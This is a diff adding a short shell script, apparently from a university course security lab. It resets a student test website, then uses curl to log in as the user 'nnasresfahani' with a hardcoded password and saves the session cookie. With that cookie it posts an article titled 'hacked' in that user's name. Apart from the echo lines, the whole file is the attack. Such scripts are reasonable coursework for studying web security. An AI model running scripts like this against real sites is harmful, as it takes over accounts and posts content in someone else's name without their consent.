@@ -1,0 +1,6 @@
+echo "************************************************************"
+echo "this script will first reset the website, and then post an artile on behalf of the user nnasresfahani"
+echo "************************************************************"
+curl "http://ugster20.student.cs.uwaterloo.ca/reset/r82zhang"
+curl -c mycookie "http://$1/post.php" -d "username=nnasresfahani" -d "password=bluejays" -d "form=login" -d "submit=Login"
+curl -b mycookie -d "title=hacked" -d "content=nnasresfahani really loves bluejays" -d "type=1" -d "form=content" -d "submit=Post"  "http://$1//post.php"
